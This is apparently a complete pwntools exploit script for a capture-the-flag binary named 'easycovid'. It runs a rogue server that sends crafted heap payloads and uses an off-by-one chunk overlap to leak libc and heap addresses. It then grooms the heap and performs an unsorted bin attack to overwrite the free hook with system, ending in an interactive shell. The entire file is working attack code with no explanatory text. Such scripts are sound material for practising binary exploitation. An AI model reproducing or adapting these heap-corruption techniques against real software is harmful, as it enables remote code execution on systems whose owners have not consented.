#!/usr/bin/env python2

import sys,os
from pwn import *
import threading
import time

context.update(arch="amd64", endian="little", os="linux", )

LOCAL = True
HOST="easycovid.game.alcapwnctf.in"
PORT=31337

TARGET=os.path.realpath("easycovid")
LIBRARY=""

EXP_HOST=""
assert EXP_HOST != ""

e = ELF(TARGET, False)

class Server(object):
    def __init__(self, port = 4444):
        self.messages = dict()
        self.messages[0] = {"metadata":"M"*(0x18-1), "data":"D"*(0xf8-1), "send":True, "slow":False}
        self.messages[1] = {"metadata":"M"*(0x68-1), "data":"D"*(0xf8-1), "send":True, "slow":False}
        self.messages[2] = {"metadata":"M"*(0x28-1), "data":"D"*(0xf8-1), "send":True, "slow":False}
        self.messages[3] = {"metadata":"M"*(0x68-8)+p64(0x290), "data":"D"*(0xf8-1), "send":True, "slow":False}
        self.messages[4] = {"metadata":"M"*(0x28-1), "data":"D"*0xf8+p64(0x20)+p64(0)+"D"*(0x10-1), "send":True, "slow":False}
        self.messages[5] = {"metadata":"M"*(0x18-1), "data":"D"*(0x18-1), "send":True, "slow":False}

        # Heap grooming messages
        self.messages[6] = {"metadata":"G"*(0x78-1), "data":"H"*(0x78-1), "send":True, "slow":False}
        self.messages[7] = {"metadata":"G"*(0x78-1), "data":"H"*(0x78-1), "send":True, "slow":False}
        self.messages[8] = {"metadata":"G"*(0x68)+p64(0x71)+"\x00"*(0x8-1), "data":"H"*(0x68-1), "send":True, "slow":False}


        self.m_id = 0
        self.port = port
        self.slowdowntime = 5.0

        thread = threading.Thread(target=self.run, args=())
        thread.daemon = True
        thread.start()

    def set_exp_msg(self, metadata, data, send):
        self.metadata = metadata
        self.data = data
        self.send = send

    def set_m_id(self, value):
        self.m_id = value

    def add_msg(self,key, value):
        self.messages[key] = value

    def run(self):
        while True:
            s = listen(bindaddr = "0.0.0.0",port=self.port, typ = "tcp")
            s.wait_for_connection()

            metadata = self.messages[self.m_id].get("metadata","")
            data = self.messages[self.m_id].get("data","")
            send_data = self.messages[self.m_id].get("send",True)
            slow_data = self.messages[self.m_id].get("slow",False)

            payload = ""
            payload += p32(len(metadata))
            payload += p32(len(data))

            s.send(payload)

            payload = ""
            if send_data:
                if slow_data:
                    sleeptime = self.slowdowntime/len(metadata)
                    log.info("Slowdown time is {}".format(sleeptime))
                    for c in metadata:
                        s.send(c)
                        time.sleep(sleeptime)

                    s.send(data)

                else:
                    payload += metadata
                    payload += data
                    s.send(payload)

            s.close()

s = Server()

def newtab():
    time.sleep(0.25)
    r.sendlineafter(">> ","N")
    r.sendlineafter("Hostname: ",EXP_HOST)
    r.sendlineafter("Port: ",str(4444))

def closetab(id):
    r.sendlineafter(">> ","C")
    r.sendlineafter(">> ",str(id))

def viewtab(id):
    r.sendlineafter(">> ","V")
    r.sendlineafter(">> ",str(id))

def exploit(r):
    r.recvline()
    r.sendline()

    newtab()
    newtab()
    raw_input("Press Enter 1/6 ")
    s.set_m_id(1)
    newtab()

    raw_input("Press Enter 2/6 ")
    s.set_m_id(2)
    newtab()

    closetab(2) #close tab to allow editing
    s.set_m_id(3)
    newtab() #New payload for off by one

    closetab(1) #close tab for free checks
    closetab(3) #close tab for overlapping chunk

    s.set_m_id(4)
    newtab() #align chunk with chunk in use

    viewtab(2)
    r.recvline()
    libcbase = u64(r.recvline().strip()+"\x00\x00")-0x3c4b78
    log.warning("libc at {}".format(hex(libcbase)))

    # Chunk overlapping for heap leak
    raw_input("Press Enter 3/6 ")
    s.set_m_id(5)
    newtab()
    closetab(3)

    viewtab(2)
    r.recvline()
    heapleak = r.recvline()[:-1]
    heapbase = u64(heapleak+"\x00"*(8-len(heapleak)))-0x220

    log.warning("heap at {}".format(hex(heapbase)))

    # Perform heap grooming for unsorted bin attack
    closetab(1) #100
    closetab(0) #120

    s.set_m_id(6)
    newtab()
    raw_input("Press Enter 4/6 ")
    s.set_m_id(7)
    newtab()
    raw_input("Press Enter 5/6 ")
    s.set_m_id(8)
    newtab()
    closetab(0)
    closetab(1)
    closetab(3)
    closetab(2)

    # Perform unsorted bin attack to write 0x7f
    FH = libcbase+0x3c678b
    UB = libcbase+0x3c4b78


    s.add_msg(9, {"metadata":"\x00"*(0x28-1), "data":p64(0)+p64(0x161)+p64(UB)+p64(FH)+"\x00"*(0x48-1), "send":True, "slow":False})
    s.set_m_id(9)
    newtab()
    closetab(0)

    # Trigger Unsorted Bin attack
    s.add_msg(10,{"metadata":"U"*(0x158-1), "data":p64(heapbase+0x1a0)+"\x00"*0x60+p64(0x71)+p64(FH+0xd)[:-1], "send":True, "slow":False})
    s.set_m_id(10)
    newtab()

    raw_input("Press Enter 6/6 ")
    s.add_msg(10,{"metadata":p64(libcbase+0x453a0)+"\x00"*0x5f, "data":"/bin/sh\x00"+"\x00"*(0x60-1), "send":True, "slow":False})
    s.set_m_id(10)
    newtab()

    # Trigger free to pop shell
    closetab(1)
    log.success("Got shell, let's roll")

    r.interactive()
    return

if __name__ == "__main__":

    if len(sys.argv) > 1:
        LOCAL = False
        r = remote(HOST, PORT)
    else:
        LOCAL = True
        r = process([TARGET,])#,env={'LD_PRELOAD':LIB}) #remove the ')#'
        pause()

    exploit(r)

    sys.exit(0)
